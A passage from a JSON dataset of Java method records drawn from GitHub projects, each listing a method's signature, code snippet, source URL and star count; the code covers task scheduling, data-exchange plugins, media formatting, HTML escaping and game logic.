"TaskPluginCollector", "params": ["Record", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void collectDirtyRecord(final Record dirtyRecord,\n                                   final String errorMessage) {\n        this.collectDirtyRecord(dirtyRecord, null, errorMessage);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/plugin/TaskPluginCollector.java", "stars": "23", "class_props": {"extends": null, "implements": ["PluginCollector"], "modifiers": ["public", "abstract"]}}, {"id": 59304, "method_name": "collectDirtyRecord", "class_name": "TaskPluginCollector", "params": ["Record", "Throwable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void collectDirtyRecord(final Record dirtyRecord, final Throwable t) {\n        this.collectDirtyRecord(dirtyRecord, t, \"\");\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/plugin/TaskPluginCollector.java", "stars": "23", "class_props": {"extends": null, "implements": ["PluginCollector"], "modifiers": ["public", "abstract"]}}, {"id": 59305, "method_name": "collectMessage", "class_name": "TaskPluginCollector", "params": ["String", "String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void collectMessage(final String key, final String value);\n\n    /**\n     * Collect task's parameter\n     * @param key param key\n     * @param value string value\n     * @param isUnique if is a unique key\n     */\n    public abstract void collectParameter(final String key, final String value, boolean isUnique);\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/plugin/TaskPluginCollector.java", "stars": "23", "class_props": {"extends": null, "implements": ["PluginCollector"], "modifiers": ["public", "abstract"]}}, {"id": 59306, "method_name": "collectParameter", "class_name": "TaskPluginCollector", "params": ["String", "String", "boolean"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void collectParameter(final String key, final String value, boolean isUnique);\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/plugin/TaskPluginCollector.java", "stars": "23", "class_props": {"extends": null, "implements": ["PluginCollector"], "modifiers": ["public", "abstract"]}}, {"id": 59307, "method_name": "isFilled", "class_name": "ContractInfoStepData", "params": ["DynActionForm", "Connection"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isFilled( DynActionForm form, Connection con )\n\t\tthrows BGException\n\t{\n\t\tParamValueDAO paramValueDAO = new ParamValueDAO( con );\n\t\tCommonLinkDAO linkDAO = CommonLinkDAO.getLinkDAO( Process.OBJECT_TYPE, con );\n\n\t\tfor( Rule rule : step.getRules() )\n\t\t{\n\t\t\tSet<Integer> vals = paramValueDAO.getParamList( data.getProcess().getId(), rule.checkParamId );\n\t\t\tif( !vals.contains( rule.paramValue ) )\n\t\t\t{\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tList<CommonObjectLink> links = linkDAO.getObjectLinksWithType( data.getProcess().getId(), Contract.OBJECT_TYPE + \":%\" );\n\t\t\tfor( CommonObjectLink link : links )\n\t\t\t{\n\t\t\t\tString billingId = rule.billingId;\n\t\t\t\tint moduleId = rule.moduleId;\n\n\t\t\t\tif( billingId.equals( link.getLinkedObjectType().split( \":\" )[1] ) )\n\t\t\t\t{\n\t\t\t\t\tint contractId = link.getLinkedObjectId();\n\t\t\t\t\tString contractTitle = link.getLinkedObjectTitle();\n\n\t\t\t\t\tContractDAO contractDAO = new ContractDAO( data.getUser(), billingId );\n\t\t\t\t\tDocument doc = contractDAO.getContractCardDoc( contractId );\n\n\t\t\t\t\tvpnLogin = DialUpDAO.getLogin( doc, moduleId, contractId );\n\t\t\t\t\tvpnPassword = DialUpDAO.getPassword( doc, moduleId, contractId );\n\n\t\t\t\t\t// \u0435\u0441\u043b\u0438 \u0435\u0441\u0442\u044c \u0444\u043b\u0430\u0433, \u043d\u0430\u0445\u043e\u0434\u0438\u043c \u0415\u0414 \u0438 \u0432\u044b\u0442\u0430\u0441\u043a\u0438\u0432\u0430\u0435\u043c \u0435\u0433\u043e \u043f\u0430\u0440\u043e\u043b\u044c\n\t\t\t\t\tif( rule.showCommonContract )\n\t\t\t\t\t{\n\t\t\t\t\t\tfor( CommonObjectLink commonContractLink : linkDAO.getObjectLinksWithType( data.getProcess().getId(), CommonContract.OBJECT_TYPE ) )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif( contractTitle.startsWith( commonContractLink.getLinkedObjectTitle() ) )\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tcommonContract = new CommonContractDAO( con ).getContractById( commonContractLink.getLinkedObjectId() );\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\treturn true;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/model/process/wizard/ContractInfoStepData.java", "stars": "12", "class_props": {"extends": "StepData", "implements": null, "modifiers": ["public"]}}, {"id": 59308, "method_name": "getVpnLogin", "class_name": "ContractInfoStepData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getVpnLogin()\n\t{\n\t\treturn vpnLogin;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/model/process/wizard/ContractInfoStepData.java", "stars": "12", "class_props": {"extends": "StepData", "implements": null, "modifiers": ["public"]}}, {"id": 59309, "method_name": "getVpnPassword", "class_name": "ContractInfoStepData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getVpnPassword()\n\t{\n\t\treturn vpnPassword;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/model/process/wizard/ContractInfoStepData.java", "stars": "12", "class_props": {"extends": "StepData", "implements": null, "modifiers": ["public"]}}, {"id": 59310, "method_name": "getCommonContract", "class_name": "ContractInfoStepData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CommonContract", "snippet": "\tpublic CommonContract getCommonContract()\n\t{\n\t\treturn commonContract;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/model/process/wizard/ContractInfoStepData.java", "stars": "12", "class_props": {"extends": "StepData", "implements": null, "modifiers": ["public"]}}, {"id": 59311, "method_name": "parseMessage", "class_name": "MessageDecoderFactoryApp", "params": ["ByteBuf"], "throws": null, "modifiers": ["public"], "return_type": "AbstractNetMessage", "snippet": "    public AbstractNetMessage parseMessage(ByteBuf byteBuf) {\n\n        return new AbstractNetMessage();\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/coding/decoder/MessageDecoderFactoryApp.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59312, "method_name": "Initialize", "class_name": "MyScene", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void Initialize() {\t\t\n\t\t\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/gameTest/MyScene.java", "stars": "33", "class_props": {"extends": "Scene", "implements": null, "modifiers": ["public"]}}, {"id": 59313, "method_name": "Update", "class_name": "MyScene", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void Update() {\n\t\t\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/gameTest/MyScene.java", "stars": "33", "class_props": {"extends": "Scene", "implements": null, "modifiers": ["public"]}}, {"id": 59314, "method_name": "Render", "class_name": "MyScene", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void Render(Graphics g) {\n\t\t\t    \n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/gameTest/MyScene.java", "stars": "33", "class_props": {"extends": "Scene", "implements": null, "modifiers": ["public"]}}, {"id": 59315, "method_name": "getShader", "class_name": "TemperatureEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {\n\n        String scaleString = \"scale = \" + (2.0f * scale - 1.0f) + \";\\n\";\n\n        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"\n                + \"precision mediump float;\\n\"\n                + \"uniform samplerExternalOES sTexture;\\n\"\n                + \" float scale;\\n\"\n                + \"varying vec2 vTextureCoord;\\n\"\n                + \"void main() {\\n\" // Parameters that were created above\n                + scaleString\n                + \"  vec4 color = texture2D(sTexture, vTextureCoord);\\n\"\n                + \"  vec3 new_color = color.rgb;\\n\"\n                + \"  new_color.r = color.r + color.r * ( 1.0 - color.r) * scale;\\n\"\n                + \"  new_color.b = color.b - color.b * ( 1.0 - color.b) * scale;\\n\"\n                + \"  if (scale > 0.0) { \\n\"\n                + \"    new_color.g = color.g + color.g * ( 1.0 - color.g) * scale * 0.25;\\n\"\n                + \"  }\\n\"\n                + \"  float max_value = max(new_color.r, max(new_color.g, new_color.b));\\n\"\n                + \"  if (max_value > 1.0) { \\n\"\n                + \"     new_color /= max_value;\\n\" + \"  } \\n\"\n                + \"  gl_FragColor = vec4(new_color, color.a);\\n\" + \"}\\n\";\n\n        return shader;\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/TemperatureEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 59316, "method_name": "handledType", "class_name": "XssStringJsonSerializer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class<String>", "snippet": "    public Class<String> handledType() {\n        return String.class;\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/common/xss/XssStringJsonSerializer.java", "stars": "137", "class_props": {"extends": "JsonSerializer", "implements": null, "modifiers": ["public"]}}, {"id": 59317, "method_name": "serialize", "class_name": "XssStringJsonSerializer", "params": ["String", "JsonGenerator", "SerializerProvider"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void serialize(String value, JsonGenerator jsonGenerator, SerializerProvider serializerProvider)\n            throws IOException {\n        if (value != null) {\n            String encodedValue = StringEscapeUtils.escapeHtml4(value);\n            jsonGenerator.writeString(encodedValue);\n        }\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/common/xss/XssStringJsonSerializer.java", "stars": "137", "class_props": {"extends": "JsonSerializer", "implements": null, "modifiers": ["public"]}}, {"id": 59318, "method_name": "getInteger", "class_name": "IjkMediaFormat", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getInteger(String name) {\n        if (mMediaFormat == null)\n            return 0;\n\n        return mMediaFormat.getInt(name);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/IjkMediaFormat.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaFormat"], "modifiers": ["public"]}}, {"id": 59319, "method_name": "getString", "class_name": "IjkMediaFormat", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getString(String name) {\n        if (mMediaFormat == null)\n            return null;\n\n        if (sFormatterMap.containsKey(name)) {\n            Formatter formatter = sFormatterMap.get(name);\n            return formatter.format(this);\n        }\n\n        return mMediaFormat.getString(name);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/IjkMediaFormat.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaFormat"], "modifiers": ["public"]}}, {"id": 59320, "method_name": "format", "class_name": "Formatter", "params": ["IjkMediaFormat"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String format(IjkMediaFormat mediaFormat) {\n            String value = doFormat(mediaFormat);\n            if (TextUtils.isEmpty(value))\n                return getDefaultString();\n            return value;\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/IjkMediaFormat.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["static", "private", "abstract"]}}, {"id": 59321, "method_name": "doFormat", "class_name": "Formatter", "params": ["IjkMediaFormat"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "String", "snippet": "        protected abstract String doFormat(IjkMediaFormat mediaFormat);\n\n        @SuppressWarnings(\"SameReturnValue\")\n        protected String getDefaultString() {\n            return \"N/A\";\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/IjkMediaFormat.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["static", "private", "abstract"]}}, {"id": 59322, "method_name": "getDefaultString", "class_name": "Formatter", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "        protected String getDefaultString() {\n            return \"N/A\";\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/IjkMediaFormat.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["static", "private", "abstract"]}}, {"id": 59323, "method_name": "savePatientInfo", "class_name": "PatientDao", "params": ["Patient"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean savePatientInfo(Patient patient){\n        entityManager.persist(patient);\n        return true;\n    }", "url": "https://raw.githubusercontent.com/chandureddys/spring-boot-doc-appointment/master/src/main/java/com/docappointment/project/dao/PatientDao.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59324, "method_name": "create", "class_name": "FirstContactIncident", "params": ["Empire", "Empire"], "throws": null, "modifiers": ["public", "static"], "return_type": "FirstContactIncident", "snippet": "    public static FirstContactIncident create(Empire e1, Empire e2) {\n        FirstContactIncident inc = new FirstContactIncident(e1, e2);\n        return inc;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/FirstContactIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 59325, "method_name": "title", "class_name": "FirstContactIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String title()            { return text(\"INC_FIRST_CONTACT_TITLE\"); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/FirstContactIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 59326, "method_name": "description", "class_name": "FirstContactIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String description()      { return  decode(text(\"INC_FIRST_CONTACT_DESC\")); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/FirstContactIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 59327, "method_name": "key", "class_name": "FirstContactIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String key()              { return \"First Contact\"; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/FirstContactIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 59328, "method_name": "decode", "class_name": "FirstContactIncident", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String decode(String s) {\n        String s1 = super.decode(s);\n        s1 = galaxy().empire(empMe).replaceTokens(s1, \"my\");\n        s1 = galaxy().empire(empYou).replaceTokens(s1, \"your\");\n        return s1;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/FirstContactIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 59329, "method_name": "cancelTaskByToken", "class_name": "TM", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void cancelTaskByToken(Object token) {\n        manager.cancelTaskByToken(token);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59330, "method_name": "cancelTaskById", "class_name": "TM", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void cancelTaskById(int taskId) {\n        manager.cancelTask(taskId);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59331, "method_name": "triggerEventTaskFinished", "class_name": "TM", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void triggerEventTaskFinished(int taskID) {\n        manager.triggerEventTaskFinished(taskID);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59332, "method_name": "triggerEvent", "class_name": "TM", "params": ["Object", "int", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void triggerEvent(Object group, int event, Object data) {\n        manager.triggerEvent(group, event, data);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59333, "method_name": "triggerEvent", "class_name": "TM", "params": ["int", "int", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void triggerEvent(int groupId, int event, Object data) {\n        manager.triggerEvent(groupId, event, data);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59334, "method_name": "triggerEvent", "class_name": "TM", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void triggerEvent(int event) {\n        manager.triggerEvent(event);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59335, "method_name": "triggerEvent", "class_name": "TM", "params": ["int", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void triggerEvent(int event, Object data) {\n        manager.triggerEvent(event, data);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59336, "method_name": "needTaskSyncWithTimeout", "class_name": "TM", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void needTaskSyncWithTimeout(int taskId, int timeOutMillions) {\n        manager.needTaskSyncWithTimeout(taskId, timeOutMillions);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59337, "method_name": "needTaskAsync", "class_name": "TM", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void needTaskAsync(int taskId) {\n        manager.needTaskAsync(taskId);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59338, "method_name": "needTaskSync", "class_name": "TM", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void needTaskSync(int taskId) {\n        manager.needTaskSync(taskId);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59339, "method_name": "waitForTaskWithTimeout", "class_name": "TM", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void waitForTaskWithTimeout(int taskId, int timeOutMillions) {\n        manager.waitForTaskWithTimeout(taskId, timeOutMillions);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59340, "method_name": "executeParallel", "class_name": "TM", "params": ["int", "Task"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void executeParallel(int timeout, Task... tasks) {\n        manager.executeParallel(timeout, tasks);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59341, "method_name": "triggerEventTaskFinished", "class_name": "TM", "params": ["int", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void triggerEventTaskFinished(int taskId, Object var) {\n        manager.triggerEventTaskFinished(taskId, var);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59342, "method_name": "executeParallel", "class_name": "TM", "params": ["Task"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void executeParallel(Task... tasks) {\n        manager.executeParallel(tasks);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59343, "method_name": "getWorkHandler", "class_name": "TM", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Handler", "snippet": "    public static Handler getWorkHandler() {\n        return manager.getWorkHandler();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59344, "method_name": "getMainHandler", "class_name": "TM", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Handler", "snippet": "    public static Handler getMainHandler() {\n        return manager.getMainHandler();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59345, "method_name": "isTaskRegistered", "class_name": "TM", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isTaskRegistered(int tid) {\n        return manager.isTaskRegistered(tid);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59346, "method_name": "genNewEventId", "class_name": "TM", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int genNewEventId() {\n        return eventId.incrementAndGet();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59347, "method_name": "createDataBuilder", "class_name": "TM", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "DataMaker", "snippet": "    public static DataMaker createDataBuilder() {\n        return new DataMaker();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59348, "method_name": "genGroupId", "class_name": "TM", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int genGroupId() {\n        // group ID \u603b\u5171\u652f\u6301 0~ 0xfff;\n        return groupId.incrementAndGet();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59349, "method_name": "genGroupId", "class_name": "TM", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int genGroupId(Object groupIdentity) {\n        return TaskRecorder.generateGroupId(groupIdentity);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59350, "method_name": "genEventIdbyGroup", "class_name": "TM", "params": ["int", "int"], "throws": null, "modifiers": ["static"], "return_type": "int", "snippet": "    static int genEventIdbyGroup(int groupId, int event) {\n        return 0x40000000 + (groupId << 16) + event;\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59351, "method_name": "crashIf", "class_name": "TM", "params": ["boolean", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void crashIf(boolean bl, String msg) {\n        if (bl && TMLog.isDebug()) {\n            throw new IllegalStateException(msg);\n        }\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59352, "method_name": "setMaxRunningThreadCount", "class_name": "TM", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setMaxRunningThreadCount(int size) {\n        manager.setMaxRunningThreadCount(size);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59353, "method_name": "postUI", "class_name": "TM", "params": ["Runnable"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void postUI(Runnable runnable) {\n        new RunnableTask(runnable).postUI();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59354, "method_name": "postUIDelay", "class_name": "TM", "params": ["Runnable", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void postUIDelay(Runnable runnable, int delay) {\n        new RunnableTask(runnable).postUIDelay(delay);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59355, "method_name": "postAsyncDelay", "class_name": "TM", "params": ["Runnable", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void postAsyncDelay(Runnable runnable, int delay) {\n        new RunnableTask(runnable).postAsyncDelay(delay);\n\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59356, "method_name": "postAsync", "class_name": "TM", "params": ["Runnable"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void postAsync(Runnable runnable) {\n        new RunnableTask(runnable).postAsync();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59357, "method_name": "enableObjectReuse", "class_name": "TM", "params": ["boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void enableObjectReuse(boolean enable) {\n        ObjectPool.enableDataPool(enable);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59358, "method_name": "executeAsyncNow", "class_name": "TM", "params": ["Runnable"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static 